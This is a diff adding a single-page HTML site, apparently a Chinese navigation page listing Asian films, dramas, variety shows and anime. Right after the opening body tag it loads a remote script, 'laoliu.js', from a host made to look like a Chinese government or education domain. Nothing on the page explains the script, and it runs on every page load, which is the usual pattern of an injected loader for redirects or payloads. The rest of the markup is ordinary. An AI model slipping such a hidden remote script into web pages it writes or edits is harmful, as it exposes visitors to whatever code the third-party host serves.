@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>亚洲电影网 - 华语电影/日韩剧集/东南亚综艺/动漫导航</title>
+<meta name="description" content="亚洲电影网(yazhoudianyingwang-h5.github.io)整理华语电影、日韩剧集、东南亚综艺、动漫新番片单，覆盖亚洲各地区影视内容，移动端自适应导航站。">
+<meta name="keywords" content="亚洲电影网,华语电影,日韩剧集,东南亚综艺,动漫新番,亚洲影视">
+<meta name="author" content="亚洲电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="亚洲电影网 - 亚洲影视导航">
+<meta property="og:description" content="亚洲电影网整理华语电影、日韩剧集、东南亚综艺、动漫新番片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yazhoudianyingwang-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;background:#0a1628;color:#e8eef7;line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* 经纬顶栏 */
+.geo-bar{position:sticky;top:0;z-index:999;background:rgba(10,22,40,.96);border-bottom:2px solid #1a3a5c;padding:.6rem .9rem}
+.geo-top{display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:1.08rem;font-weight:900;letter-spacing:.5px}
+.brand b{color:#e63946;text-shadow:0 0 10px rgba(230,57,70,.4)}
+.brand i{color:#5c946e;font-style:normal}
+.coord{font-size:.7rem;color:#8aa9c9}
+.coord b{color:#f8f9fa}
+.longitude{height:3px;background:linear-gradient(90deg,#e63946 0%,#e63946 33%,#5c946e 33%,#5c946e 66%,#f8f9fa 66%,#f8f9fa 100%);border-radius:3px;margin-top:.5rem}
+.fan-tabs{display:flex;gap:.3rem;margin-top:.55rem;overflow-x:auto;padding:.2rem 0}
+.fan-tabs a{font-size:.74rem;padding:.35rem .75rem;white-space:nowrap;border-radius:50% 50% 8px 8px / 20% 20% 8px 8px;border:1px solid #1a3a5c;color:#8aa9c9;transition:.3s;transform-origin:bottom center}
+.fan-tabs a.active,.fan-tabs a:hover{background:linear-gradient(180deg,#e63946,#c41e3a);color:#f8f9fa;font-weight:700;border-color:transparent;transform:scale(1.05) translateY(-2px)}
+
+.wrap{padding:1rem;max-width:1100px;margin:0 auto}
+.pavilion{display:none;animation:unfold .45s ease}
+.pavilion.active{display:block}
+@keyframes unfold{from{opacity:0;transform:rotateX(-8deg) translateY(12px)}to{opacity:1;transform:none}}
+.pavilion h2{font-size:1.22rem;color:#e63946;margin:0 0 1rem;padding-left:.6rem;border-left:4px solid #5c946e;position:relative}
+.pavilion h2:before{content:"";position:absolute;left:-4px;top:50%;width:4px;height:4px;background:#e63946;border-radius:50%;transform:translateY(-50%)}
+
+/* 首页 */
+#home .atrium{background:radial-gradient(120% 130% at 15% 85%,#1a3a5c,#0a1628 60%);border:1px solid #1a3a5c;border-radius:0 0 24px 24px;padding:1.8rem 1.6rem;margin-bottom:1rem;position:relative;overflow:hidden}
+#home .atrium:before{content:"🗺️";position:absolute;right:10px;bottom:-15px;font-size:7rem;opacity:.06}
+#home .atrium h1{font-size:1.7rem;color:#f8f9fa;margin-bottom:.4rem;font-weight:900}
+#home .atrium h1 span{color:#e63946}
+#home .atrium p{font-size:.86rem;color:#8aa9c9}
+.regions{display:grid;grid-template-columns:repeat(4,1fr);gap:.7rem;margin-top:1rem}
+.regions div{background:#0f1f38;border:1px solid #1a3a5c;border-radius:0 14px 0 14px;padding:.9rem;text-align:center;position:relative}
+.regions div:before{content:"";position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,#e63946,#5c946e)}
+.regions h3{color:#f8f9fa;font-size:.92rem;margin-bottom:.15rem}
+.regions p{font-size:.66rem;color:#6a8bad}
+
+/* 卷轴卡片 */
+.scroll-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:.9rem}
+.scroll{background:#0f1f38;border:1px solid #1a3a5c;border-radius:6px 6px 14px 14px;overflow:hidden;position:relative;transition:.25s}
+.scroll:hover{transform:translateY(-4px);box-shadow:0 12px 28px rgba(230,57,70,.15);border-color:#e63946}
+.scroll .silk{height:118px;display:flex;align-items:flex-end;justify-content:flex-start;padding:.8rem;font-weight:800;font-size:.82rem;color:#f8f9fa;position:relative}
+.scroll .silk:after{content:"";position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,transparent 48%,#f8f9fa 48%,#f8f9fa 52%,transparent 52%)}
+.scroll .sk1{background:linear-gradient(135deg,#e63946,#8b0000)}
+.scroll .sk2{background:linear-gradient(135deg,#5c946e,#2d5a3d)}
+.scroll .sk3{background:linear-gradient(135deg,#1a3a5c,#0a1628)}
+.scroll .sk4{background:linear-gradient(135deg,#c41e3a,#e63946)}
+.scroll .sk5{background:linear-gradient(135deg,#2d5a3d,#5c946e)}
+.scroll .sk6{background:linear-gradient(135deg,#8b0000,#c41e3a)}
+.scroll .info{padding:.7rem}
+.scroll h3{font-size:.86rem;color:#f8f9fa;margin-bottom:.15rem}
+.scroll .detail{display:flex;justify-content:space-between;font-size:.7rem;color:#6a8bad}
+.scroll .mark{position:absolute;top:8px;right:8px;background:#0a1628dd;color:#f8f9fa;font-size:.6rem;padding:.2rem .45rem;border-radius:3px;font-weight:700;border:1px solid #e63946}
+
+/* 水墨时间轴 */
+.ink-line{display:flex;flex-direction:column;gap:.8rem;padding-left:.5rem;border-left:3px solid #1a3a5c}
+.ink-item{display:flex;gap:.9rem;background:#0f1f38;border:1px solid #1a3a5c;border-radius:0 12px 12px 0;padding:.9rem;position:relative}
+.ink-item:before{content:"";position:absolute;left:-12px;top:1.1rem;width:8px;height:8px;background:#e63946;border-radius:50%;border:2px solid #0a1628}
+.ink-item .stamp{width:42px;height:42px;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1.1rem;background:linear-gradient(135deg,#5c946e,#1a3a5c)}
+.ink-item h3{font-size:.92rem;color:#f8f9fa;margin-bottom:.2rem}
+.ink-item p{font-size:.74rem;color:#8aa9c9}
+.ink-item .eps span{display:inline-block;background:#1a3a5c;color:#f8f9fa;font-size:.64rem;padding:.15rem .45rem;border-radius:3px;margin:.25rem .2rem 0 0}
+
+/* 灯笼横滑 */
+.lantern-reel{display:flex;gap:.7rem;overflow-x:auto;padding:.4rem .2rem}
+.lantern-reel::-webkit-scrollbar{height:5px}.lantern-reel::-webkit-scrollbar-thumb{background:#1a3a5c;border-radius:5px}
+.lantern{min-width:160px;background:#0f1f38;border:1px solid #1a3a5c;border-radius:12px 12px 4px 4px;padding:.9rem;text-align:center;position:relative}
+.lantern:before{content:"";position:absolute;top:-6px;left:50%;transform:translateX(-50%);width:20px;height:6px;background:#e63946;border-radius:3px 3px 0 0}
+.lantern .e{font-size:1.6rem}
+.lantern h3{font-size:.84rem;color:#f8f9fa;margin:.3rem 0 .15rem}
+.lantern p{font-size:.7rem;color:#6a8bad}
+
+/* 动漫 */
+.anime-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.8rem}
+.anime{background:#0f1f38;border:1px solid #1a3a5c;border-radius:8px;overflow:hidden}
+.anime .tile{height:96px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;color:#f8f9fa}
+.anime .t1{background:linear-gradient(135deg,#e63946,#5c946e)}
+.anime .t2{background:linear-gradient(135deg,#1a3a5c,#5c946e)}
+.anime .t3{background:linear-gradient(135deg,#c41e3a,#e63946)}
+.anime .body{padding:.55rem}
+.anime h3{font-size:.8rem;color:#f8f9fa}
+.anime span{font-size:.66rem;color:#6a8bad}
+
+/* 关于 */
+.about-asia{background:radial-gradient(120% 120% at 80% 20%,#1a3a5c,#0a1628);border:1px solid #e63946;border-radius:0 24px 0 24px;padding:1.5rem}
+.about-asia h2{color:#e63946;border:0;padding:0;margin-bottom:.8rem}
+.about-asia p{font-size:.85rem;color:#8aa9c9;margin-bottom:.6rem}
+.about-asia .info{margin-top:1rem;background:#0f1f38;border:1px dashed #5c946e;border-radius:8px;padding:1rem}
+.about-asia .info h3{color:#5c946e;margin-bottom:.4rem}
+.about-asia .info p{font-size:.78rem;color:#6a8bad}
+
+.foot{text-align:center;padding:1.4rem 1rem;border-top:1px solid #1a3a5c;margin-top:1.6rem;font-size:.72rem;color:#3a5a7c}
+@media(max-width:768px){.regions{grid-template-columns:repeat(2,1fr)}.scroll-grid{grid-template-columns:1fr 1fr}.brand{font-size:.95rem}#home .atrium h1{font-size:1.38rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="geo-bar">
+  <div class="geo-top">
+    <div class="brand">亚洲<b>电影网</b> <i>🗺️</i></div>
+    <div class="coord">坐标 <b>N35° E139°</b> · 亚洲影视专线</div>
+  </div>
+  <div class="longitude"></div>
+  <nav class="fan-tabs">
+    <a href="#" class="ftab active" data-p="home">亚洲首页</a>
+    <a href="#" class="ftab" data-p="movie">华语电影</a>
+    <a href="#" class="ftab" data-p="drama">日韩剧集</a>
+    <a href="#" class="ftab" data-p="show">东南亚综艺</a>
+    <a href="#" class="ftab" data-p="anime">动漫新番</a>
+    <a href="#" class="ftab" data-p="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <section id="home" class="pavilion active">
+    <div class="atrium">
+      <h1>亚洲<span>电影网</span></h1>
+      <p>从东亚到东南亚，从华语大片到日韩热剧，一张地图覆盖全亚洲影视版图。</p>
+      <div class="regions">
+        <div><h3>华语</h3><p>内地 / 港台</p></div>
+        <div><h3>日韩</h3><p>日本 / 韩国</p></div>
+        <div><h3>东南亚</h3><p>泰 / 新 / 马 / 印尼</p></div>
+        <div><h3>全品类</h3><p>电影/剧/综/漫</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="movie" class="pavilion">
+    <h2>🎬 华语电影 · 卷轴片单</h2>
+    <div class="scroll-grid">
+      <div class="scroll"><div class="mark">华语</div><div class="silk sk1">满江红</div><div class="info"><h3>满江红</h3><div class="detail"><span>剧情 / 悬疑</span><span>2023</span></div></div></div>
+      <div class="scroll"><div class="mark">港片</div><div class="silk sk2">无间道</div><div class="info"><h3>无间道</h3><div class="detail"><span>犯罪 / 动作</span><span>2002</span></div></div></div>
+      <div class="scroll"><div class="mark">新片</div><div class="silk sk3">热辣滚烫</div><div class="info"><h3>热辣滚烫</h3><div class="detail"><span>喜剧 / 励志</span><span>2024</span></div></div></div>
+      <div class="scroll"><div class="mark">经典</div><div class="silk sk4">霸王别姬</div><div class="info"><h3>霸王别姬</h3><div class="detail"><span>剧情 / 文艺</span><span>1993</span></div></div></div>
+      <div class="scroll"><div class="mark">动作</div><div class="silk sk5">叶问4</div><div class="info"><h3>叶问4</h3><div class="detail"><span>动作 / 传记</span><span>2019</span></div></div></div>
+      <div class="scroll"><div class="mark">科幻</div><div class="silk sk6">流浪地球2</div><div class="info"><h3>流浪地球2</h3><div class="detail"><span>科幻 / 灾难</span><span>2023</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="drama" class="pavilion">
+    <h2>📺 日韩剧集 · 水墨时间轴</h2>
+    <div class="ink-line">
+      <div class="ink-item"><div class="stamp">🇰🇷</div><div><h3>黑暗荣耀</h3><p>韩国复仇剧，校园霸凌受害者成年后的精密复仇计划。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span><span>第5集</span></div></div></div>
+      <div class="ink-item"><div class="stamp">🇯🇵</div><div><h3>重启人生</h3><p>日本奇幻剧，女主不断回到过去试图改变命运。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span></div></div></div>
+      <div class="ink-item"><div class="stamp">🇰🇷</div><div><h3>泪之女王</h3><p>财阀夫妇婚姻危机与绝症考验下的爱情故事。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span><span>第5集</span></div></div></div>
+      <div class="ink-item"><div class="stamp">🇯🇵</div><div><h3>非自然死亡</h3><p>法医学者破解离奇死亡案件，揭露社会真相。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="show" class="pavilion">
+    <h2>🎤 东南亚综艺 · 灯笼横滑</h2>
+    <div class="lantern-reel">
+      <div class="lantern"><div class="e">🇹🇭</div><h3>泰国变装秀</h3><p>曼谷最大变装表演</p></div>
+      <div class="lantern"><div class="e">🇸🇬</div><h3>新加坡美食</h3><p>街头小贩探店</p></div>
+      <div class="lantern"><div class="e">🇲🇾</div><h3>马来西亚旅行</h3><p>热带雨林探险</p></div>
+      <div class="lantern"><div class="e">🇮🇩</div><h3>印尼文化节</h3><p>传统舞蹈与音乐</p></div>
+      <div class="lantern"><div class="e">🇻🇳</div><h3>越南好声音</h3><p>音乐选秀节目</p></div>
+    </div>
+  </section>
+
+  <section id="anime" class="pavilion">
+    <h2>🎨 动漫新番 · 番剧格子</h2>
+    <div class="anime-grid">
+      <div class="anime"><div class="tile t1">间谍过家家</div><div class="body"><h3>间谍过家家</h3><span>搞笑 / 动作</span></div></div>
+      <div class="anime"><div class="tile t2">电锯人</div><div class="body"><h3>电锯人</h3><span>热血 / 黑暗</span></div></div>
+      <div class="anime"><div class="tile t3">鬼灭之刃</div><div class="body"><h3>鬼灭之刃 柱训练篇</h3><span>热血 / 2024</span></div></div>
+      <div class="anime"><div class="tile t1">葬送的芙莉莲</div><div class="body"><h3>葬送的芙莉莲</h3><span>奇幻 / 治愈</span></div></div>
+      <div class="anime"><div class="tile t2">咒术回战</div><div class="body"><h3>咒术回战</h3><span>热血 / 完结</span></div></div>
+      <div class="anime"><div class="tile t3">我独自升级</div><div class="body"><h3>我独自升级</h3><span>热血 / 12集</span></div></div>
+    </div>
+  </section>
+
+  <section id="about" class="pavilion">
+    <div class="about-asia">
+      <h2>关于 亚洲电影网</h2>
+      <p>亚洲电影网是一个覆盖亚洲各地区影视内容的导航站，整理华语电影、日韩剧集、东南亚综艺、动漫新番的片单与分类浏览。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。</p>
+      <p>本站仅做影视信息展示与分类导航，不提供盗版资源，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="info">
+        <h3>站点信息</h3>
+        <p>网站名称：亚洲电影网</p>
+        <p>网址：https://yazhoudianyingwang-h5.github.io</p>
+        <p>关键词：亚洲电影网、华语电影、日韩剧集、东南亚综艺、动漫新番</p>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <p>© 2024 亚洲电影网 | https://yazhoudianyingwang-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+var ftabs=document.querySelectorAll('.ftab');
+ftabs.forEach(function(f){
+  f.addEventListener('click',function(e){
+    e.preventDefault();
+    var p=this.dataset.p;
+    document.querySelectorAll('.pavilion').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(p).classList.add('active');
+    ftabs.forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
